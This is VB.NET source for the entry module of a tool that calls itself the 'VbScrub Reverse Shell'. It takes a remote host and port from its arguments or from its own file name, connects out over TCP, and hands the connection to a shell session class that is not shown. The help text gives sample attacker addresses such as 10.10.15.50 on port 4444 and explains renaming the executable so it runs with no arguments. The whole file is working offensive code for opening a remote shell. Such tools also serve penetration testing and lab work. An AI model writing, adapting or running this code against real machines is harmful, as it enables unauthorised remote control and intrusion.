Imports System.Net.Sockets

Module MainModule

    Private _Server As VbRevServer
    Private _AllowClose As New System.Threading.AutoResetEvent(False)

    Sub Main()

        'Give time for the WPF app to launch and start listening for connections when debugging both projects
#If DEBUG Then
        Threading.Thread.Sleep(2000)
#End If

        Try
            Console.WriteLine(Environment.NewLine & "VbScrub Reverse Shell v" & My.Application.Info.Version.ToString & Environment.NewLine)
            Dim ExeNameSuppliesArgs As Boolean
            Dim RemoteMachine As String = String.Empty
            Dim PortNumber As Integer
            Try
                Dim ExeName As String = IO.Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs(0))
                If ExeName.Contains("_"c) Then
                    ExeNameSuppliesArgs = True
                    Console.WriteLine("Parsing arguments from executable name " & ExeName, False)
                    Dim Split() As String = ExeName.Split("_"c)
                    RemoteMachine = Split(1)
                    PortNumber = Integer.Parse(Split(2))
                End If
            Catch ex As Exception
                Console.WriteLine("Error parsing executable name: " & ex.Message)
                Exit Sub
            End Try
            If Not ExeNameSuppliesArgs Then
                If My.Application.CommandLineArgs.Count < 2 OrElse My.Application.CommandLineArgs(0) = "/?" Then
                    ShowHelp()
                    Exit Sub
                End If
                Log.Enabled = My.Application.CommandLineArgs.Contains("/debug")
                Log.VerboseEnabled = My.Application.CommandLineArgs.Contains("/v")
                RemoteMachine = My.Application.CommandLineArgs(0)
                PortNumber = Integer.Parse(My.Application.CommandLineArgs(1))
            End If

            Console.WriteLine("Connecting to " & RemoteMachine & " on port " & PortNumber & "...")
            Dim Client As New TcpClient(RemoteMachine, PortNumber)
            _Server = New VbRevServer(New NetworkSession(Client, False, TimeSpan.Zero), RemoteMachine, PortNumber)
            AddHandler _Server.Closed, AddressOf Server_Closed
            _Server.Start()
            Console.WriteLine("Successfully connected to " & My.Application.CommandLineArgs(0))
            _AllowClose.WaitOne()
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub ShowHelp()
        Console.WriteLine("USAGE:" & Environment.NewLine & Environment.NewLine &
                          "  VbRev.exe RemoteHost PortNumber [/debug]" & Environment.NewLine & Environment.NewLine &
                          "Can also be run without arguments by renaming the executable like so: VbRev_XXXX_YYY" & Environment.NewLine &
                          "Replacing XXXX with the hostname and replacing YYY with the port number." & Environment.NewLine & Environment.NewLine &
                          "EXAMPLES:" & Environment.NewLine & Environment.NewLine &
                          "  VbRev.exe srv1.mydomain.local 80" & Environment.NewLine & Environment.NewLine &
                          "  VbRev.exe 10.10.15.50 4444" & Environment.NewLine & Environment.NewLine &
                          "  VbRev_10.10.15.50_4444.exe" & Environment.NewLine & Environment.NewLine &
                          "The last 2 examples will both do the same thing. One uses command line arguments and one uses the file name to supply" & Environment.NewLine &
                          "the arguments" & Environment.NewLine)
    End Sub

    Private Sub Server_Closed()
        Console.WriteLine("Closing down")
        _AllowClose.Set()
    End Sub

End Module
